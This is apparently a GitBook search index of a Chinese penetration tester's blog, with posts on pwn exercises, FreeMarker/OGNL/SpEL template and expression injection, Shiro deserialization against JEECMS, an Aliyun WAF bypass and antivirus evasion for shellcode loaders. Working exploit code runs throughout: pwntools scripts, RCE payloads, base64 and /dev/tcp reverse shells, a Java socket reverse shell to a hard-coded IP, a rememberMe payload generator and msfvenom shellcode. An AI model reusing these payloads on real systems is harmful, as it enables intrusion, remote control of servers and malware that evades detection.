{"./":{"url":"./","title":"Introduction","keywords":"","body":"Introduction 工作许久，发现“好记性不如烂笔头”太有道理。但各种经验和想法都记录下来之后还需提炼回顾，故新开此博客。 Copyright © R4ph4e1 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-09-11 08:02:11 "},"markdown/PWN练习记录/Pwn3绕过Canary.html":{"url":"markdown/PWN练习记录/Pwn3绕过Canary.html","title":"Pwn3绕过Canary","keywords":"","body":"PWN3 需要绕过金丝雀值 看IDA发现存在格式化字符串读取漏洞 尝试读取金丝雀值 %p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p 翻车，堆栈距离太远了无法读取\\x00结尾的canary 去掉点号，增大可读范围 获得金丝雀值为第35位 改为输入%35$p获得相应值 IDA双击buf查看地址偏移量 找到可以getshell的内存地址 获取Canary，溢出+Canary+覆盖ebp一把梭 x64 #!/usr/bin/env python from pwn import * context.binary = './pwn3' # context.log_level = 'debug' io = process('./pwn3') get_shell = 0x0804932F #ELF(\"./pwn3\").sym[\"getshell\"] # 这里是得到getshell函数的起始地址 io.recvuntil(\"your name:\") # leak Canary payload = \"A\"*100 + \"A\" * 4 # 这里再加4个 A 是因为 100 模 8 是 4 ，如果不补齐 8 位，则无法覆盖canary后面的 \\x00 io.sendline(payload) # 这里使用 sendline() 会在payload后面追加一个换行符 '\\n' 对应的十六进制就是0xa io.recvuntil(\"A\"*104) Canary = u32(io.recv(8))-0xa # 这里减去0xa是为了减去上面的换行符，得到真正的 Canary log.info(\"Canary:\"+hex(Canary)) # Bypass Canary payload = b\"\\x90\"*104+p32(Canary)+b\"\\x90\"*8+p32(get_shell) # 使用getshell的函数地址覆盖原来的返回地址 io.send(payload) io.recv() io.interactive() x86 #!/usr/bin/env python from pwn import * context.binary = './pwn3' # context.log_level = 'debug' io = process('././pwn3') get_shell = 0x0804932F #ELF(\"././pwn3\").sym[\"getshell\"] # 这里是得到getshell函数的起始地址 io.recvuntil(\"your name:\") # leak Canary payload = \"A\"*100 io.sendline(payload) # 这里使用 sendline() 会在payload后面追加一个换行符 '\\n' 对应的十六进制就是0xa io.recvuntil(\"A\"*100) Canary = u32(int.from_bytes(io.recv(4),\"little\"))-0xa # 这里减去0xa是为了减去上面的换行符，得到真正的 Canary log.info(\"Canary:\"+hex(Canary)) # Bypass Canary payload = b\"\\x90\"*100+p32(Canary)+b\"\\x90\"*12+p32(get_shell) # 使用getshell的函数地址覆盖原来的返回地址 io.send(payload) io.recv() io.interactive() # coding:utf-8 from pwn import * context.terminal=['tmux',\"splitw\",\"-h\"] context.log_level='debug' sh = process(\"./pwn3\") elf = ELF(\"./pwn3\") get_shell = 0x0804932F payload1 = '%'+str(35)+'$'+'p' sh.recvuntil(\"your name:\") sh.sendline(payload1) sh.recvuntil(\"Hello,0x\") canary=int(sh.recv(8),16) success(\"canary => \"+hex(canary)) payload2 = \"a\"*100 payload2 += str(p32(canary)) payload2 += \"b\"*8+\"b\"*4 payload2 += str(p32(get_shell)) sh.sendline(payload2) sh.interactive() \"a\" * 0x60 + \"a\" * 4 + p32(canary) + 'b'*8 + 'b'*4 + p32(get_shell) Copyright © R4ph4e1 2023 all right reserved，powered by Gitbook该文章修订时间： 2021-06-17 01:44:04 "},"markdown/PWN练习记录/Pwn基础溢出练习.html":{"url":"markdown/PWN练习记录/Pwn基础溢出练习.html","title":"Pwn基础溢出练习","keywords":"","body":"Pwn基础溢出练习 又一个PWN1，先看看安全保护机制 看看main() 看看shift+F12字符串 利用get()溢出到system()，system()上通过Ctrl+E找到地址401040 双击s字符串，发现溢出长度应为15字节+8字节（db 8 dup(?)），即偏移量23 db： 定义字节类型变量的伪指令 dup()： 重复定义圆括号中指定的初值，次数由前面的数值决定 ?： 只分配存储空间，不指定初值 开gdb调试gdb pwn1 生成溢出字符串pattern create 200 AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA 启动程序start 步进contin并输入溢出字符串获得溢出调试 pattern offset (这里粘贴栈底或者rbp的字符串) wc，偏移长度怎么是24？？？ 不管了，python脚本一把梭试试看（堆栈平衡要+1） from pwn import * p = remote('118.190.151.140',60001) payload = b'a' * 24 + p64(0x401040 + 1) p.sendline(payload) p.interactive() 果不其然，翻车了 仔细检查一下，发现引入函数的地址不对应该是0x401142 from pwn import * p = remote('118.190.151.140',60001) payload = b'a' * 24 + p64(0x401142 + 1) p.sendline(payload) p.interactive() 成功获得Shell Copyright © R4ph4e1 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-12-24 18:34:02 "},"markdown/实战记录/SSTI实战/FreeMarker模板注入实例.html":{"url":"markdown/实战记录/SSTI实战/FreeMarker模板注入实例.html","title":"FreeMarker模板注入实例","keywords":"","body":"FreeMarker模板注入实例 一、前言 尽管JAVA模板引擎们大都可以实现差不多的功能效果，但经过多次测试和经验进行判断，FreeMarker多用于邮件等HTML模板，Thymeleaf多用于更精致的前端页面数据展示。 二、FreeMarker环境搭建 下面很大一部分参考来自Eleven师傅的博客文章，FreeMarker模板注入实现远程命令执行，针对实际测试情况作了一些改动和丰富payload形式并填了一些测试过程中遇到的坑。 什么是 FreeMarker? FreeMarker 是一款 模板引擎：即一种基于模板和要改变的数据， 并用来生成输出文本(HTML网页，电子邮件，配置文件，源代码等)的通用工具。 它不是面向最终用户的，而是一个Java类库，是一款程序员可以嵌入他们所开发产品的组件。 模板编写为FreeMarker Template Language (FTL)。它是简单的，专用的语言， 不是 像PHP那样成熟的编程语言。 那就意味着要准备数据在真实编程语言中来显示，比如数据库查询和业务运算， 之后模板显示已经准备好的数据。在模板中，你可以专注于如何展现数据， 而在模板之外可以专注于要展示什么数据。 常用的几种类型： 文本：包括HTML标签与静态文本等静态内容，会原样输出； 插值：这部分的输出会被计算的数据来替换，使用${}这种语法； 标签：给FreeMarker的指示，可以简单与指令等同，不会打印在内容中，比如； 注释：由表示，不会被freemarker处理 根据FreeMarker官方开发文档，搭建一个简单的测试环境，由于我们首要模板就是执行命令，所以直接读取test.ftl里的FreeMarker语句进行FreeMarker引擎解析，结果输出到控制台即可，没有去参考Eleven师傅的方法。 freeMark.java import freemarker.template.*; import java.util.*; import java.io.*; public class freeMark { public static void main(String[] args) throws Exception { /* ------------------------------------------------------------------------ */ /* You should do this ONLY ONCE in the whole application life-cycle: */ /* Create and adjust the configuration singleton */ Configuration cfg = new Configuration(/*Configuration.VERSION_2_3_9*/); cfg.setDirectoryForTemplateLoading(new File(\"E:\\\\winbak\\\\tools\\\\08_Audit\\\\freemarker_test\\\\src\\\\main\\\\java\")); cfg.setDefaultEncoding(\"UTF-8\"); cfg.setTemplateExceptionHandler(TemplateExceptionHandler.RETHROW_HANDLER); /* ------------------------------------------------------------------------ */ /* You usually do these for MULTIPLE TIMES in the application life-cycle: */ //Configuration cfg = new Configuration(); /* Create a data-model */ Map root = new HashMap(); root.put(\"user\", \"Big Joe\"); Map latest = new HashMap(); root.put(\"latestProduct\", latest); latest.put(\"url\", \"products/greenmouse.html\"); latest.put(\"name\", \"green mouse\"); /* Get the template (uses cache internally) */ Template temp = cfg.getTemplate(\"test.ftl\"); /* Merge data-model with template */ Writer out = new OutputStreamWriter(System.out); temp.process(root, out); // Note: Depending on what `out` is, you may need to call `out.close()`. // This is usually the case for file output, but not for servlet output. } } pom.xml 4.0.0 org.example freemarker_test 1.0-SNAPSHOT org.freemarker freemarker 2.3.9 org.python jython-standalone 2.7.2 test.ftl ${\"freemarker.template.utility.Execute\"?new()(\"calc.exe\")} 三、使用内置函数构造命令执行 FreeMarker高级内置函数 参考：https://freemarker.apache.org/docs/ref_builtins_expert.html 其中， new函数创建一个继承 freemarker.template.TemplateModel 类的变量。 构造Payload方法一(适用于各种版本，如2.3.9、2.3.17、2.3.30) freemarker.template.utility里面有个Execute类，如下图所示，这个类会执行它的参数，因此我们可以利用new函数新建一个Execute类，传输我们要执行的命令作为参数，从而构造远程命令执行漏洞。 构造payload: ${value(\"curl http://127.0.0.1:8080\")} 另一种方式，不使用标签，直接使用字符串并入到变量中。(当) ${\"freemarker.template.utility.Execute\"?new()(\"bash -c {echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzEyNy4wLjAuMS84ODg4IDA+JjEg}|{base64,-d}|{bash,-i}\")} 构造Payload方法二(适用于中高版本，如2.3.17、2.3.30) freemarker.template.utility里面有个ObjectConstructor类，如下图所示，这个类会把它的参数作为名称，构造了一个实例化对象。因此我们可以构造一个可执行命令的对象，从而构造远程命令执行漏洞。 构造payload: ${value(\"java.lang.ProcessBuilder\",\"calc.exe\").start()} ${\"freemarker.template.utility.ObjectConstructor\"?new()(\"java.lang.ProcessBuilder\",\"calc.exe\").start()} 构造Payload方法三(在引入jython-standalone依赖的情况下，适用于各种版本，如2.3.9、2.3.17、2.3.30) freemarker.template.utility里面的JythonRuntime，可以通过自定义标签的方式，执行Python命令，从而构造远程命令执行漏洞。 构造payload（不能使用${}变量写法）: import os;os.system(\"calc.exe\") 实测当pom拉取的依赖不对时，jython导入不了os库，推测和winodws环境变量之类的有关。这种情况下jython实际可用的库似乎只有sys。： import sys;print sys.version;print sys.version_info; 错误的引入如下，为非独立版本，在burp插件中使用的jython也必须为standalone。 org.python jython 2.7.2 正确的版本应该引入standalone版本，本事包含了python的标准库（with the Python standard library (/Lib) files included）。 org.python jython-standalone 2.7.2 四、关于安全机制 引用关于FreeMarker模板注入的说明，可发现 四. FreeMarker安全机制 上述三种利用方式，FreeMarker也作出了安全措施。 l 从2.3.17版本开始使用Configuration.setNewBuiltinClassResolver(TemplateClassResolver)或者new_builtin_class_resolver设置来限制内置函数new对类的访问。此处官方提供了三个预定义的解析器： UNRESTRICTED_RESOLVER：简单地调用ClassUtil.forName(String)。 SAFER_RESOLVER：和第一个类似，但禁止解析ObjectConstructor，Execute和freemarker.template.utility.JythonRuntime。 ALLOWS_NOTHING_RESOLVER：禁止解析任何类。 当然用户自身也可以自定义解析器以拓展对危险类的限制，只需要实现TemplateClassResolver接口就好了。 l api内建函数并不能随意使用，必须在配置项api_builtin_enabled为true时才有效，而该配置在2.3.22版本之后默认为false。 l 同时为了防御通过其他方式调用恶意方法，FreeMarker内置了一份危险方法名单unsafeMethods.properties[3]，诸如getClassLoader、newInstance等危险方法都被禁用了。 l 在Freemarker 2.3.30 中引入了一个基于MemberAccessPolicy 的新沙箱。默认策略改进了黑名单并禁止通过反射访问ClassLoader方法和公共字段。 import freemarker.template.*; import java.util.*; import java.io.*; import static freemarker.core.TemplateClassResolver.*;/*要引入对应的常量*/ public class freeMark { public static void main(String[] args) throws Exception { /* ------------------------------------------------------------------------ */ /* You should do this ONLY ONCE in the whole application life-cycle: */ /* Create and adjust the configuration singleton */ Configuration cfg = new Configuration(/*Configuration.VERSION_2_3_9*/); cfg.setDirectoryForTemplateLoading(new File(\"E:\\\\winbak\\\\tools\\\\08_Audit\\\\freemarker_test\\\\src\\\\main\\\\java\")); cfg.setDefaultEncoding(\"UTF-8\"); cfg.setTemplateExceptionHandler(TemplateExceptionHandler.RETHROW_HANDLER); cfg.setNewBuiltinClassResolver(SAFER_RESOLVER);/*默认设置是UNRESTRICTED_RESOLVER，则百无禁忌*/ /* ------------------------------------------------------------------------ */ /* You usually do these for MULTIPLE TIMES in the application life-cycle: */ //Configuration cfg = new Configuration(); /* Create a data-model */ Map root = new HashMap(); root.put(\"user\", \"Big Joe\"); Map latest = new HashMap(); root.put(\"latestProduct\", latest); latest.put(\"url\", \"products/greenmouse.html\"); latest.put(\"name\", \"green mouse\"); /* Get the template (uses cache internally) */ Template temp = cfg.getTemplate(\"test.ftl\"); /* Merge data-model with template */ Writer out = new OutputStreamWriter(System.out); temp.process(root, out); // Note: Depending on what `out` is, you may need to call `out.close()`. // This is usually the case for file output, but not for servlet output. } } 五、实战反弹shell演示 测试是否出网 使用${value(\"ping bf127738.dns.1433.eu.org -c 4\")}，在[邮件主题]处输入并点击[保存]，发现可以执行ping命令，收到dnslog记录。 测试反弹Shell 进一步反弹shell连接，使用bash -c {echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzEyNy4wLjAuMS84ODg4IDA+JjEg}|{base64,-d}|{bash,-i}命令，插入到payload执行命令部分，可以取得服务器root权限。 关于反弹shell部分可参考 Java Runtime.exe() 执行命令与反弹shell（上） Java Runtime.exe() 执行命令与反弹shell（下） 复测尝试绕过 测试payload a${2*24} //返回a48 aIt contains \"ice\" //当匹配到ice时，返回aIt contains \"ice\",未匹配到时返回a 发现支持插值${}和标签 同时在标题和正文分分别使用两个payload试试， ${x} ${\"freemarker.template.utility.ObjectConstructor\"?new()(\"java.lang.ProcessBuilder\",\"ping 4374587f.dns.1433.eu.org -c 8\").start()} 标题执行了标签，正文不能执行标签 正文只能执行插值${\"freemarker.template.utility.ObjectConstructor\"?new()(\"java.lang.ProcessBuilder\",\"ping 4374587f.dns.1433.eu.org -c 8\").start()} 显然，它配置了cfg.setNewBuiltinClassResolver(SAFER_RESOLVER);用来修复漏洞。 再使用特殊变量查看版本等信息 ${.version}, ${.output_format}, ${.template_name} , ${.current_template_name} , ${.now} 看看能不能用api，一般2.3.22版本以后默认不允许使用。因为邮件主题不能返回太长的东西，只能在正文里输入： ${\"object\"?api.class.protectionDomain.classLoader} 果然，不能使用。 我们再看看标题和正文的联系，用一个读文件试试 ${aaa} 返回值说明读到了当前的模板文件，但是不包含邮件正文的${version}，属于每次调用都动态生成，没有路径。我猜想动态生成的模板指针是在jvm里，只能读内存的东西。没法调用系统层的。 我们再试试读文件 Template was found. Template was missing. 没有文件，麻了，可能是在jvm里。 Copyright © R4ph4e1 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-12-24 18:28:13 "},"markdown/实战记录/Shiro实战/JEECMS的Shiro-C3P0链.html":{"url":"markdown/实战记录/Shiro实战/JEECMS的Shiro-C3P0链.html","title":"JEECMS的Shiro C3P0链","keywords":"","body":"JEECMS的Shiro-C3P0链 寻找信息 特征1 组件信息 tomcat v7 v9.X安装说明 找到v9.3安装包，发现无法使用CC链 另外找到v8.1版本为shiro 1.3.0，v7为shiro 1.2.2，cc均为3.1 本地调试 已知CC、CB链无法使用，shiro-CB链可能无法使用，DNS链可以，此处可以考虑的则是c3p0或者hibernate 本地小测试一下发现版本0.9.5.2不对，不能使用。 后来发现依赖是0.9.1.1，v8.1也是一样 修改yso依赖 生成序列化数据 生成rememberMe数据 发送rememberMe数据 获得Dns结果 实战利用 生成命令执行exp的jar包 放到服务器上开启http服务，再用c3p0链生成payload执行 可以看到支持sh和bash，但只能wget，没有curl命令 到此一游 多种方法测试反弹Shell不成功，无奈只能用java Socket反弹Shell，因为是docker所以可以执行的命令非常少 import java.io.IOException; import java.io.InputStream; import java.io.OutputStream; import java.net.Socket; public class exp3 { public exp3() throws IOException, InterruptedException { String host=\"121.36.84.244\"; int port=7555; String cmd=\"/bin/sh\"; Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start(); Socket s=new Socket(host,port); InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream(); OutputStream po=p.getOutputStream(),so=s.getOutputStream(); while(!s.isClosed()) { while(pi.available()>0) { so.write(pi.read()); } while(pe.available()>0) { so.write(pe.read()); } while(si.available()>0) { po.write(si.read()); } so.flush(); po.flush(); Thread.sleep(50); try { p.exitValue(); break; } catch (Exception e){ } }; p.destroy(); s.close(); } // public static void main(String[] args) throws IOException, InterruptedException { // new exp3(); // } } 题外话 ———————————————————————————————————————————————————————————— 此外，理论上还有Shiro-CB原生链 测试时惊奇的发现shiro 1.3.0居然无法使用shiro-CB，因为没有利用到父类的CC依赖。那么实战环境使用shiro-CB链无法成功就是自然而然的事情了。 但很怪异的一点是添加CC3.1依赖后 完全可以使用CC-K1链 而V8.1版本是存在CC3.1的，项目快结束了，待后续研究 Copyright © R4ph4e1 2023 all right reserved，powered by Gitbook该文章修订时间： 2021-09-13 09:07:29 "},"markdown/实战记录/Shiro实战/再战JEECMS-shiro的小技巧.html":{"url":"markdown/实战记录/Shiro实战/再战JEECMS-shiro的小技巧.html","title":"再战JEECMS Shiro的小技巧","keywords":"","body":"再战JEECMS-shiro的小技巧 前言 又一次攻防中，还是遇到了JEECMS，同样是有key，但是没有常规链可以回显。使用DNSURL利用链可以出网。 收集信息 又一个小技巧：通过install.html可以查看jeecms的版本。 使用DNSURL来探测其他利用链 对于shiro，使用成熟的exp工具来自动回显利用的情况已经越来越少。大部分情况下，即使找到key也无法找到合适的利用方式和正确的利用版本（工具生成序列化字符串时使用的依赖版本与服务器上运行的依赖版本不符就会产生报错，无法反序列化）。 但是由于DNSURL链是基于jar包且不受版本影响的，所以遇到shiro的出网的站时，可以用这个工具生成利用链探测payload，实操如下： 注意此时生成的是base64编码的值，shiro验证和利用还需要自己写脚本进行aes或者gcm的加密。使用Burp输入cookie字段发包后可以得知为Windows服务器，存在c3p0-92版本和cc31版本依赖（但不是一定就可以利用）。 相关EXP脚本 验证时，我则是配合一个魔改yso写了个脚本来批量生成payload。 # pip install pycrypto import sys import base64 import uuid from random import Random import subprocess from Crypto.Cipher import AES def encode_rememberme(command,gadget): popen = subprocess.Popen(['java', '-jar', '.\\\\ysoserial-for-woodpecker-0.5.1.jar', '-g', gadget , '-a', command], stdout=subprocess.PIPE) BS = AES.block_size pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode() key = \"4AvVhmFLUs0KTA3Kprsdag==\" mode = AES.MODE_CBC iv = uuid.uuid4().bytes encryptor = AES.new(base64.b64decode(key), mode, iv) file_body = pad(popen.stdout.read()) base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body)) return base64_ciphertext def encode_rememberme1(): popen = subprocess.Popen(['java', '-jar', '.\\\\ysoserial-for-woodpecker-0.5.1.jar', '-g', 'URLDNS' , '-a', 'http://test5.351999e7.dns.1433.eu.org'], stdout=subprocess.PIPE) BS = AES.block_size pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode() key = \"4AvVhmFLUs0KTA3Kprsdag==\" mode = AES.MODE_CBC iv = uuid.uuid4().bytes encryptor = AES.new(base64.b64decode(key), mode, iv) file_body = pad(popen.stdout.read()) base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body)) return base64_ciphertext if __name__ == '__main__': cmd = sys.argv[1] gadgets = ['C3P0','C3P0_LowVer','CommonsBeanutils1','CommonsBeanutils1_183','CommonsBeanutils2','CommonsBeanutils2_183','CommonsBeanutils3', 'CommonsCollections1','CommonsCollections2','CommonsCollections3','CommonsCollections4','CommonsCollections5','CommonsCollections6','CommonsCollections7','CommonsCollections8', 'CommonsCollections9','CommonsCollections10','CommonsCollections11','CommonsCollections6Lite','CommonsCollectionsK1','CommonsCollectionsK2','CommonsCollectionsK3','CommonsCollectionsK4'] for gadget in gadgets: payload=encode_rememberme(cmd,gadget) with open(\"./payload.cookie\", \"a+\") as fpw: print(\"rememberMe={}\".format(payload.decode()), file=fpw) payload1=encode_rememberme1() with open(\"./payload.cookie\", \"a+\") as fpw: print(\"rememberMe={}\".format(payload1.decode()), file=fpw) Copyright © R4ph4e1 2023 all right reserved，powered by Gitbook该文章修订时间： 2022-06-20 13:46:41 "},"markdown/实战记录/Shiro实战/记一次shiro爆杀阿里云WAF.html":{"url":"markdown/实战记录/Shiro实战/记一次shiro爆杀阿里云WAF.html","title":"记一次Shiro爆杀阿里云WAF","keywords":"","body":"记一次shiro爆杀阿里云WAF 先通过dnslog链进行测试，即使危害小也均不能通过。 测试发现删除部分字节则WAF会放过。 此处有两个推理： 推理1：阿里云WAF不会进行行为检查，拦截与否只和能否解析base64字串有关 推理2：阿里云WAF会进行行为检查，拦截也和能否解析base64字串有关 使用精简的dnslog测试不通过 插入大量混淆字符不通过 经过多次测试，结合最开始的情况，确定为推理1 精简版dnslog链，结果追加等号，依然可以识别特征 先插入混淆字符，此时仍然失败 注意此处为插入混淆后，末尾追加了一个=符号 为什么能成功呢？ 奥秘就在base64解析上。 base64编码默认为4的整数倍，不足时会使用=符号进行填充，额外增加的=因长度无法被4整除导致解析畸形。 阿里云waf使用的编码语言的base64库无法应对这种情况。 其次，在java和javascript的部分base64解码方法中，是允许这种情况出现的，而且额外填充的=符号几乎不会影响解码结果 记录一下操作的工具https://github.com/woodpecker-framework/ysoserial-for-woodpecker java -jar .\\ysoserial-for-woodpecker-0.5.2.jar -g FindClassByDNS -a \"http://cc31x.7a043e66.dns.1433.eu.org|org.apache.commons.collections.functors.ChainedTransformer\" --dirt-data-length 4000| base64 |sed ':label;N;s/\\n//;b labe l' >shir2.txt python3 .\\shiro_gcm.py -f E:\\winbak\\tools\\03_POC_EXP\\shiro\\shir2.txt Copyright © R4ph4e1 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-12-24 18:12:35 "},"markdown/实战记录/表达式注入实战/OGNL注入实战.html":{"url":"markdown/实战记录/表达式注入实战/OGNL注入实战.html","title":"OGNL注入实战","keywords":"","body":"OGNL注入实战 报！前方有洞！ 发现一个参数存在表达式注入，一看就是java环境，那么可能是FreeMarker的SSTI，也可能是EL表达式/OGNL表达式。为什么报错呢？因为输入的参数与数据库指定的字段类型不符，于是产生了报错。 开始使用各种阴间的畸形表达式尝试报错： 接着尝试发现了是Mybatis中使用的OGNL表达式产生了错误，不支持a(111)这种表达。 对Mybatis和开发感兴趣的同学可以参考下文 https://blog.csdn.net/isea533/article/details/50061705 再探再报！ 此时已知是ognl表达式，可以进一步测试。测试是否可以执行代码，把int转换成String，看来效果不明显。 getInputStream()方法是继承Stream接口的实例才能有的方法，其他的实例是无法使用的，比如Int对象和String对象都没有这个方法，所以会报错不是指定的对象object。根据这个特性的报错可以进行判断，此时是Int。 而toString()还是可以正常执行的，此时报错为String。 不讲武德！ 经过反复测试，确认构造方法可以执行，对象可以调用方法等等。 OGNL表达式分析推荐阅读：https://www.mi1k7ea.com/2020/03/16/OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/#0x05-OGNL%E6%94%BB%E9%98%B2%E5%8F%B2 学完之后发现按照最老版本的Structs2的OGNL表达式注入攻击手法，只需要给之前的Payload添加亿点点细节，就可以Shell了： ${@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('whoami').getInputStream())} 尝试反弹NC（实战发现好像不出网，哈哈哈），反弹方法推荐阅读：https://www.jianshu.com/p/ae3922db1f70 给出如下payload仅供各位参考 ${@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('bash$IFS$9-i>&/dev/tcp/ip/port Copyright © R4ph4e1 2023 all right reserved，powered by Gitbook该文章修订时间： 2022-06-27 01:20:33 "},"markdown/实战记录/表达式注入实战/记一次SPEL表达式注入.html":{"url":"markdown/实战记录/表达式注入实战/记一次SPEL表达式注入.html","title":"记一次SPEL表达式注入","keywords":"","body":"记一次SPEL表达式注入 前言 一位师傅找到我测一下某目标发现的表达式注入，据说尝试了好几个exp都没反应。 投石问路 测试发现支持.符号调用静态方法，至少知道直接调用静态方法时不需要New对象。 测试发现不支持OGNL的New语法，说明不是OGNL； 试了试EL表达式的语法，貌似也不是直接的EL表达式； 三大表达式已知两个不是，剩下的比较大可能性就是SPEL。 试了一下感觉是spel表达式，通过.去调用不存在的方法时会报错，可以以此来找寻可用的方法和依赖。 调用js引擎解析执行命令绕过成功。 ${\"\".class.class.getMethod(\"newInstance\").invoke(\"\".class.forName(\"javax.script.ScriptEngineManager\")).getEngineByName(\"js\").eval(\"java.lang.Runtime.getRuntime().exec('curl http://x.x.x.x:8888/a.png')\") } 目标出网就好办了，可以试试nc反弹shell 试了弹shell没反应 ${\"\".class.class.getMethod(\"newInstance\").invoke(\"\".class.forName(\"javax.script.ScriptEngineManager\")).getEngineByName(\"js\").eval(\"java.lang.Runtime.getRuntime().exec('bash -i >& /dev/tcp/x.x.x.x/8888 0>&1')\") } 改造Payload为回显exp 根据返回值判断可以近似于如下的状况，也就是说存在回显的可能： catch(error){ System.out.println(\"开始时间\"); System.out.println(表达式执行(表达式)); System.out.println(\"格式有误。。。\"); } 调整payload，以求获得可以通过System.out.println()输出的回显。一般就是用JDK原生的java.io.BufferedReader或者第三方依赖的common-io等，记得先用java验证一下。 这边试了几个之后，发现确实存在common-io的依赖，因此可以构造payload： ${\"\".class.class.getMethod(\"newInstance\").invoke(\"\".class.forName(\"javax.script.ScriptEngineManager\")).getEngineByName(\"js\").eval(\"org.apache.commons.io.IOUtils.toString(java.lang.Runtime.getRuntime().exec('whoami').getInputStream())\")} Copyright © R4ph4e1 2023 all right reserved，powered by Gitbook该文章修订时间： 2022-10-08 02:48:14 "},"markdown/工程化/免杀相关/ShellcodeLoader自动生成器改造.html":{"url":"markdown/工程化/免杀相关/ShellcodeLoader自动生成器改造.html","title":"ShellcodeLoader自动生成器改造","keywords":"","body":"木马生成器改造（一） 前置阅读 如何实现一款 shellcodeLoader Shellcode加载器免杀调试 特征查找 首先使用前篇文章提到的syscall方式写入内存来加载shellcode（确定至少在申请内存、写入shellcode和执行相应内存块过程中不会触发火绒、360、df的动态查杀） 根据作者的工程参数设置cpp生成相应的DAT模板文件。加入文件头，设置输出目录，输出文件格式 发现360静态查杀HEUR/QVM202.0.6240.Malware.Gen，这个只能说明是Microsoft Visual Studio或者VC编译的木马，实际告警没什么有用信息。 发现火绒静态查杀：VirTool/W64.Obfuscator.af Obfus即为混淆部分被识别为特征，查看工程发现在生成exe时使用的128bit随机密钥进行异或，运行时从exe内部资源文件中读取config结构中的key变量来解密。 此处shellcodeLoaderDlg.cpp中的StreamCrypt为生成exe时的加密环节（即Shellcode存储），相关声明放在shellcodeLoaderDlg.h头文件 DAT（即内存加载模板）编译时依赖的public.hpp头文件中定义了解密函数StreamCrypt，由于是采用异或混淆，从而加密和解密函数不需要分开编写、 对加密解密函数动个小手术（加花） 利用网上一个师傅给出的花指令头文件代码进行加花 纯手工混淆C/C++代码（下） 不知道是不是加的方式不对，总之还是不行 自实现加密解密函数 看来只能自己编写加密解密函数了。好在作者结构设计明细，整体程序结构小巧灵活。 加密思路是获得一个随机值tmpfirst，存入config中；根据Shellcode获取第一个字节保存在config.first中；对Shellcode进行异或后，替换第一个字节为tmpfirst（即解密异或回来第一字节是00）。 解密思路是程序运行时Shellcode异或config.tmpfirst，并通过config.first写入Shellcode的内存空间中，获得完整的shellcode。 先从生成器部分入手，对shellcodeLoaderDlg.h中增加新声明的加密函数，对config结构进行修改。 shellcodeLoaderDlg.cpp中实现新的加密函数（简单的异或）。 shellcodeLoaderDlg.cpp中修改加密流程 修改调试参数，下断点。先启动程序，再点击调试。 紧接着修改解密部分public.hpp的config结构声明，解密函数定义 最后生成DAT时的cpp模板也需要修改 大功告成 静态动态均免杀360、火绒。df动态免杀，静态不免，想要全免把加密函数弄复杂些或者传入HEX即可。（我们下期再会） Copyright © R4ph4e1 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-12-24 18:06:52 "},"markdown/工程化/免杀相关/Shellcode加载器免杀调试.html":{"url":"markdown/工程化/免杀相关/Shellcode加载器免杀调试.html","title":"Shellcode加载器免杀调试","keywords":"","body":"shellcode加载器免杀调试 知己知彼-免杀思路 （其实这篇文章屁用没有，就是给自己记录一下。心急的同学直接用最下面的成品就可以了） 目前的反病毒安全软件，常见有三种，一种基于特征，一种基于行为，一种基于云查杀。云查杀的特点基本也可以概括为特征查杀。 对特征来讲，大多数杀毒软件会定义一个阈值，当文件内部的特征数量达到一定程度就会触发报警，也不排除杀软会针对某个EXP会限制特定的入口函数来查杀。当然还有通过md5，sha1等hash函数来识别恶意软件，这也是最简单粗暴，最容易绕过的。 针对特征的免杀较为好做，可以使用加壳改壳、添加/替换资源、修改已知特征码/会增加查杀概率的单词（比如某函数名为ExecutePayloadshellcode）、加密Shellcode等等。 CreateThread CreateThreadEx xxx -> ntdll.dll -> win32API 对行为来讲，很多个API可能会触发杀软的监控，比如注册表操作、添加启动项、添加服务、添加用户、注入、劫持、创建进程、加载DLL等等。 针对行为的免杀，我们可以使用白名单、替换API、替换操作方式（如使用WMI/COM的方法操作文件）等等方法实现绕过。除常规的替换、使用未导出的API等姿势外，我们还可以使用通过直接系统调用的方式实现，比如使用内核层面Zw系列的API，绕过杀软对应用层的监控（如使用ZwAllocateVirtualMemory函数替代VirtualAlloc）。 初级-常见的函数替换手法 利用msf生成calc的shellcode msfvenom --payload windows/x64/exec cmd=\"calc\" --format c --platform windows --bad \"\\x00\" --smallest --arch x64 使用倾旋给的常规加载器 #include // 入口函数 int wmain(int argc, TCHAR* argv[]) { int shellcode_size = 0; // shellcode长度 DWORD dwThreadId; // 线程ID HANDLE hThread; // 线程句柄 /* length: 800 bytes */ unsigned char buf[] = \"\\x48\\x31\\xc9\\x48\\x81\\xe9\\xde\\xff\\xff\\xff\\x48\\x8d\\x05\\xef\\xff\" \"\\xff\\xff\\x48\\xbb\\x74\\x27\\x43\\x06\\xd7\\x58\\xb2\\x16\\x48\\x31\\x58\" \"\\x27\\x48\\x2d\\xf8\\xff\\xff\\xff\\xe2\\xf4\\x88\\x6f\\xc0\\xe2\\x27\\xb0\" 